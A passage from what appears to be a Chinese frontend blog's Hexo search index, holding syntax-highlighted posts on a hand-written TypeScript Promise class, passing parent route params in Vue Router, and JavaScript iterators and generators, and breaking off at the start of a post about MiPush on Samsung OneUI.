class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">status</span> = <span class="title class_">PromiseStatus</span>.<span class="property">fulfilled</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">result</span> = value;</span><br><span class="line">        <span class="comment">// 执行异步回调</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">callback</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">successCB</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">reject</span>(<span class="params">value: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> != <span class="title class_">PromiseStatus</span>.<span class="property">pending</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">status</span> = <span class="title class_">PromiseStatus</span>.<span class="property">rejected</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">result</span> = value;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">callback</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">failCB</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">then</span>(<span class="params"></span></span><br><span class="line"><span class="params">        successCB: ((resolveResult: <span class="built_in">any</span>) =&gt; MyPromise | <span class="built_in">any</span>) | <span class="literal">undefined</span>,</span></span><br><span class="line"><span class="params">        failCB?: (rejectResult: <span class="built_in">any</span>) =&gt; MyPromise | <span class="built_in">any</span>,</span></span><br><span class="line"><span class="params">    </span>) &#123;</span><br><span class="line">        <span class="comment">// 如果只给了成功回调, 那么失败回调就返回参数</span></span><br><span class="line">        <span class="keyword">if</span> (!failCB) &#123;</span><br><span class="line">            failCB = <span class="function"><span class="params">err</span> =&gt;</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 判断promise状态</span></span><br><span class="line">            <span class="comment">// 同步执行</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> == <span class="title class_">PromiseStatus</span>.<span class="property">fulfilled</span>) &#123;</span><br><span class="line">                <span class="comment">// 获取回调的返回值, 作为promise的返回值</span></span><br><span class="line">                <span class="keyword">const</span> cbResult = successCB &amp;&amp; <span class="title function_">successCB</span>(<span class="variable language_">this</span>.<span class="property">result</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">handleCBResult</span>(cbResult, resolve, reject);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> == <span class="title class_">PromiseStatus</span>.<span class="property">rejected</span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> cbResult = failCB &amp;&amp; <span class="title function_">failCB</span>(<span class="variable language_">this</span>.<span class="property">result</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">handleCBResult</span>(cbResult, resolve, reject);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 异步执行</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> == <span class="title class_">PromiseStatus</span>.<span class="property">pending</span>) &#123;</span><br><span class="line">                <span class="comment">// 将回调入栈, 可能执行多次then, 所以使用数组存储回调</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">callback</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                    <span class="attr">successCB</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> cbResult = successCB &amp;&amp; <span class="title function_">successCB</span>(<span class="variable language_">this</span>.<span class="property">result</span>);</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">handleCBResult</span>(cbResult, resolve, reject);</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">failCB</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> cbResult = failCB &amp;&amp; <span class="title function_">failCB</span>(<span class="variable language_">this</span>.<span class="property">result</span>);</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">handleCBResult</span>(cbResult, resolve, reject);</span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="attr">failCB</span>: <span class="function">(<span class="params">rejectResult: <span class="built_in">any</span></span>) =&gt;</span> <span class="title class_">MyPromise</span> | <span class="built_in">any</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">then</span>(<span class="literal">undefined</span>, failCB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查是否是promise,如果不是, 直接resolve, 如果是, 等待结果并resolve或reject</span></span><br><span class="line">    <span class="title function_">handleCBResult</span>(<span class="params"></span></span><br><span class="line"><span class="params">        cbResult: MyPromise | <span class="built_in">any</span>,</span></span><br><span class="line"><span class="params">        resolve: <span class="built_in">Function</span>,</span></span><br><span class="line"><span class="params">        reject: <span class="built_in">Function</span>,</span></span><br><span class="line"><span class="params">    </span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cbResult <span class="keyword">instanceof</span> <span class="title class_">MyPromise</span>) &#123;</span><br><span class="line">            cbResult.<span class="title function_">then</span>(</span><br><span class="line">                <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(res);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(err);</span><br><span class="line">                &#125;,</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果前一个promise的状态是reject, 那么就reject</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> == <span class="title class_">PromiseStatus</span>.<span class="property">rejected</span>) &#123;</span><br><span class="line">                <span class="title function_">reject</span>(cbResult);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">resolve</span>(cbResult);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">all</span>(<span class="params">taskArr: MyPromise[]</span>) &#123;</span><br><span class="line">        <span class="comment">// 全部任务成功才resolve, 有一个失败就reject</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="attr">resultArr</span>: <span class="built_in">any</span>[] = [];</span><br><span class="line">            taskArr.<span class="title function_">forEach</span>(<span class="function"><span class="params">task</span> =&gt;</span> &#123;</span><br><span class="line">                task.<span class="title function_">then</span>(</span><br><span class="line">                    <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="comment">// 每一个任务成功之后都把结果放入结果列表</span></span><br><span class="line">                        resultArr.<span class="title function_">push</span>(res);</span><br><span class="line">                        <span class="comment">// 如果全部任务成功那么就resolve</span></span><br><span class="line">                        <span class="keyword">if</span> (resultArr.<span class="property">length</span> === taskArr.<span class="property">length</span>) &#123;</span><br><span class="line">                            <span class="title function_">resolve</span>(resultArr);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">reject</span>(err);</span><br><span class="line">                    &#125;,</span><br><span class="line">                );</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">race</span>(<span class="params">taskArr: MyPromise[]</span>) &#123;</span><br><span class="line">        <span class="comment">//返回第一个完成的结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">const</span> task <span class="keyword">of</span> taskArr) &#123;</span><br><span class="line">                task.<span class="title function_">then</span>(</span><br><span class="line">                    <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(res);</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">reject</span>(err);</span><br><span class="line">                    &#125;,</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">allSettled</span>(<span class="params">taskArr: MyPromise[]</span>) &#123;</span><br><span class="line">        <span class="comment">// 只有resolve, 所有任务完成后返回包含结果的数组</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="attr">resultArr</span>: <span class="built_in">any</span>[] = [];</span><br><span class="line">            taskArr.<span class="title function_">forEach</span>(<span class="function"><span class="params">task</span> =&gt;</span> &#123;</span><br><span class="line">                task.<span class="title function_">then</span>(</span><br><span class="line">                    <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                        resultArr.<span class="title function_">push</span>(&#123;</span><br><span class="line">                            <span class="attr">status</span>: <span class="string">&quot;fulfilled&quot;</span>,</span><br><span class="line">                            <span class="attr">value</span>: res,</span><br><span class="line">                        &#125;);</span><br><span class="line">                        <span class="keyword">if</span> (taskArr.<span class="property">length</span> == resultArr.<span class="property">length</span>) &#123;</span><br><span class="line">                            <span class="title function_">resolve</span>(resultArr);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                        resultArr.<span class="title function_">push</span>(&#123;</span><br><span class="line">                            <span class="attr">status</span>: <span class="string">&quot;rejected&quot;</span>,</span><br><span class="line">                            <span class="attr">value</span>: err,</span><br><span class="line">                        &#125;);</span><br><span class="line">                        <span class="keyword">if</span> (taskArr.<span class="property">length</span> == resultArr.<span class="property">length</span>) &#123;</span><br><span class="line">                            <span class="title function_">resolve</span>(resultArr);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                );</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">any</span>(<span class="params">taskArr: MyPromise[]</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回第一个resolve的对象, 如果全部reject , 那么就reject</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> errCount = <span class="number">0</span>;</span><br><span class="line">            taskArr.<span class="title function_">forEach</span>(<span class="function"><span class="params">task</span> =&gt;</span> &#123;</span><br><span class="line">                task.<span class="title function_">then</span>(</span><br><span class="line">                    <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(res);</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                        errCount++;</span><br><span class="line">                        <span class="keyword">if</span> (taskArr.<span class="property">length</span> == errCount) &#123;</span><br><span class="line">                            <span class="title function_">reject</span>(err);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                );</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Promise</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue Router中 子路由获取父路由的参数</title>
    <url>/20230423/Vue-Router%E4%B8%AD-%E5%AD%90%E8%B7%AF%E7%94%B1%E8%8E%B7%E5%8F%96%E7%88%B6%E8%B7%AF%E7%94%B1%E7%9A%84%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<p>一句话总结 可以给<code>router-view</code> 组件绑定 props, 这样内部的路由组件就会获取到参数了</p>
<p>如果一个子路由需要获取其上一级的路由参数，你可以在定义该子路由时使用 <code>props</code> 属性将父路由参数传递给子路由组件。然后，再在子路由组件中使用 <code>this.$route.params</code> 来获取父路由参数。</p>
<p>例如，假设有这样的路由结构：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  path: &#x27;/user/:userId&#x27;,</span><br><span class="line">  component: UserComponent,</span><br><span class="line">  children: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &#x27;profile&#x27;,</span><br><span class="line">      component: ProfileComponent</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设我们想让 <code>ProfileComponent</code> 组件能够获取到它的上一级 (<code>UserComponent</code>) 的路由参数（即 <code>userId</code>），则需要在 <code>UserComponent</code> 内部定义 <code>ProfileComponent</code> 子路由，并将父路由参数作为 <code>props</code> 传递给子组件。</p>
<p>具体代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// UserComponent.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;User Profile&lt;/h1&gt;</span><br><span class="line">    &lt;router-view :user-id=&quot;$route.params.userId&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  //...</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ProfileComponent.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;Profile Component&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;User ID: &#123;&#123; userId &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  props: [&#x27;userId&#x27;], // 将父组件传递过来的 userId 强制绑定为 props</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    console.log(&#x27;User ID:&#x27;, this.userId); // 获取父组件路由参数</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>在上述代码中，我们将 <code>$route.params.userId</code> 通过属性绑定传递给子组件，然后在 <code>ProfileComponent</code> 的 <code>mounted</code> 钩子函数中就可以通过 <code>this.userId</code> 获取到它的上一级路由参数了。</p>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>vue-router</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript Iterator 与 Generator</title>
    <url>/20230427/JavaScript-Iterator-%E4%B8%8E-Generator/</url>
    <content><![CDATA[<h1>Iterator 迭代器</h1>
<p>为各种数据结构提供一个统一的迭代方法, Iterator 迭代器主要使用 for…of 迭代</p>
<p>ES6 规定，默认的 Iterator 接口部署在数据结构的 Symbol…iterator 属性，或者说，一个数据结构只要具有 Symbol.iterator()属性，就可以认为是&quot;可遍历的”(iterable)。Symbol…iterator 属性本身是一个函数，就是当前数据结构默认的遍历器生成函数。执行这个函数，就会返回一个遍历器。</p>
<p>原生默认具备 Iterator 接口的数据结构如下。</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>Array</p>
</li>
<li class="lvl-4">
<p>Set</p>
</li>
<li class="lvl-4">
<p>Map</p>
</li>
<li class="lvl-4">
<p>String</p>
</li>
<li class="lvl-4">
<p>arguments 对象</p>
</li>
<li class="lvl-4">
<p>NodeList 对象</p>
</li>
</ul>
<p>如果一个对象具有 <code>[Symbol.Iterator]</code> 方法, 那么我们可以说它实现了迭代器, 是一个可迭代对象</p>
<p>迭代器需要返回一个函数, 此函数的返回值包含一个 next 函数, next 函数返回值有两个属性, 分别为 value 和 done</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;tim&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="attr">habits</span>: [<span class="string">&quot;sing&quot;</span>, <span class="string">&quot;jump&quot;</span>, <span class="string">&quot;rap&quot;</span>, <span class="string">&quot;basketball&quot;</span>],</span><br><span class="line">    [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">next</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">value</span>: <span class="variable language_">this</span>.<span class="property">habits</span>[index++],</span><br><span class="line">                    <span class="attr">done</span>: index &gt;= <span class="variable language_">this</span>.<span class="property">habits</span>.<span class="property">length</span> + <span class="number">1</span>,</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// const iter = obj[Symbol.iterator]();</span></span><br><span class="line"><span class="comment">// console.log(iter.next());</span></span><br><span class="line"><span class="comment">// console.log(iter.next());</span></span><br><span class="line"><span class="comment">// console.log(iter.next());</span></span><br><span class="line"><span class="comment">// console.log(iter.next());</span></span><br><span class="line"><span class="comment">// console.log(iter.next());</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> obj) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现了 <code>[Symbol.Iterator]</code> 方法的对象就可以使用 <code>for...of</code> 循环了</p>
<h2 id="Generator-生成器函数">Generator 生成器函数</h2>
<p>Generator 函数是 ES6 提供的一种异步编程解决方案<br>
Generator 函数是一个状态机，封装了多个内部状态。执行 Generator 函数会返回一个迭代器对象，也就是说，Generator 函数除了状态机，还是一个迭代器对象生成函数。返回的迭代器对象，可以依次遍历 Generator 函数内部的每一个状态。</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> res1 = <span class="keyword">yield</span> <span class="string">&quot;你好&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res1);</span><br><span class="line">    <span class="keyword">const</span> res2 = <span class="keyword">yield</span> <span class="string">&quot;世界&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res2);</span><br><span class="line">    <span class="keyword">const</span> res3 = <span class="keyword">yield</span> <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> g = <span class="title function_">gen</span>();</span><br><span class="line"><span class="comment">// for (const i of g) &#123;</span></span><br><span class="line"><span class="comment">//     console.log(i);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="number">1</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="number">3</span>));</span><br></pre></td></tr></table></figure>
<p><code>yield</code> 表达式的作用是暂停生成器函数的执行，并在该位置上将控制权交回给调用方，等到再次调用该生成器对象的 <code>next()</code> 方法时继续执行。</p>
<p><mark>!!!</mark> <code>yield</code> 表达式返回值取决于下一个 <code>next()</code> 方法中传入的参数。</p>
<p>在执行 <code>g.next(1)</code> 时，生成器函数会一直执行到第一个 <code>yield</code> 表达式处，然后暂停，将&quot;你好&quot;返回给调用者，并在等待下一次 <code>next()</code> 方法的执行。由于第一个 <code>yield</code> 表达式的返回值并不需要接收外部传递进来的任何值，因此 <code>res1</code> 变量就没有被赋值，也就是被忽略了。</p>
<h2 id="配合-promise-实现异步操作">配合 promise 实现异步操作</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">pro</span> = num =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(num * <span class="number">10</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;gen执行了&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> res1 = <span class="keyword">yield</span> <span class="title function_">pro</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res1);</span><br><span class="line">    <span class="keyword">const</span> res2 = <span class="keyword">yield</span> <span class="title function_">pro</span>(res1);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res2);</span><br><span class="line">    <span class="keyword">const</span> res3 = <span class="keyword">yield</span> <span class="title function_">pro</span>(res2);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> g = <span class="title function_">gen</span>();</span><br><span class="line"></span><br><span class="line">g.<span class="title function_">next</span>().<span class="property">value</span>.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    g.<span class="title function_">next</span>(res).<span class="property">value</span>.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">        g.<span class="title function_">next</span>(res).<span class="property">value</span>.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">            g.<span class="title function_">next</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>async/await 只是这种操作的语法糖</p>
<h1>异步迭代器</h1>
<p>如果 Generator 函数前面加了 <code>async</code>, 那么这个函数就叫做<mark>异步生成器</mark>, 异步生成器生成的叫做<mark>异步迭代器</mark>.<br>
异步迭代器的<code>.next ​</code>方法返回一个 <code>promise ​</code>对象,这个 <code>promise ​</code>对象的结果会包含 <code>value ​</code>和 <code>done ​</code>两个属性.<br>
如果<code>.next</code> 对应的 <code>yield ​</code>后面是普通对象, 那么这个 <code>promise ​</code>会立刻 <code>resolve</code>.<br>
如果<code>​ yield</code> 后面是一个 <code>promise ​</code>对象, 那么<code>.next</code> 返回的 <code>promise ​</code>被 <code>resolve ​</code>的时机是 <code>.next</code> 对应的 <code>yield ​</code>后面的 <code>promise ​</code>状态变为 <code>resolve ​</code>的时候.<br>
<code>yield ​</code>后的 <code>Promise ​</code>对象 <code>resolve ​</code>之前，代码会暂停执行, 所以如果同步调用多个<code>.next</code>, 异步迭代器内部也会按照顺序执行.</p>
<p>可以使用<code>for await (item of 异步迭代器)</code> 来迭代异步迭代器</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">timer</span> = (<span class="params">time: <span class="built_in">number</span></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(time);</span><br><span class="line">            <span class="title function_">resolve</span>(time);</span><br><span class="line">        &#125;, time);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果generator函数前面加了async, 那么这个函数就叫做异步生成器, 异步生成器生成的叫做异步迭代器.</span></span><br><span class="line"><span class="comment">// 异步迭代器的.next方法返回一个promise对象,这个 promise 对象的结果会包含 value 和 done 两个属性.</span></span><br><span class="line"><span class="comment">// 如果.next对应的yield后面是普通对象, 那么这个promise会立刻resolve.</span></span><br><span class="line"><span class="comment">// 如果yield后面是一个promise对象, 那么.next返回的promise被resolve的时机是next对应的yield后面的promise状态变为resolve的时候.</span></span><br><span class="line"><span class="comment">// yield后的Promise对象resolve之前，代码会暂停执行, 所以如果同步调用多个.next, 异步迭代器内部也会按照顺序执行.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="title function_">timer</span>(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">yield</span> <span class="title function_">timer</span>(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">yield</span> <span class="title function_">timer</span>(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">g</span>: <span class="built_in">any</span> = <span class="title function_">gen</span>();</span><br><span class="line"></span><br><span class="line">    g.<span class="title function_">next</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">res: <span class="built_in">any</span></span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res); <span class="comment">//输出&#123; value: 1000, done: false &#125;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    g.<span class="title function_">next</span>();</span><br><span class="line">    g.<span class="title function_">next</span>(); <span class="comment">// 同步调用next, 异步迭代器内部也会按顺序执行, 因为yield后的Promise对象resolve之前，代码会暂停执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// test1();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">test2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">g</span>: <span class="built_in">any</span> = <span class="title function_">gen</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> g.<span class="title function_">next</span>());</span><br><span class="line">    <span class="keyword">await</span> g.<span class="title function_">next</span>();</span><br><span class="line">    <span class="keyword">await</span> g.<span class="title function_">next</span>(); <span class="comment">// 可以使用 await 获取异步迭代器的数据</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// test2();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">test3</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">g</span>: <span class="built_in">any</span> = <span class="title function_">gen</span>();</span><br><span class="line">    <span class="comment">// 可以使用 for await (item of 异步迭代器) 来依次获取异步迭代器数据</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">await</span> (<span class="keyword">const</span> item <span class="keyword">of</span> g) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">test3</span>();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>OneUI免Root配置Mipush教程</title>
    <url>/20230528/OneUI%E5%85%8DRoot%E9%85%8D%E7%BD%AEMipush%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>众所周知, 三星的推送只是用来推送广告的(逃</p>
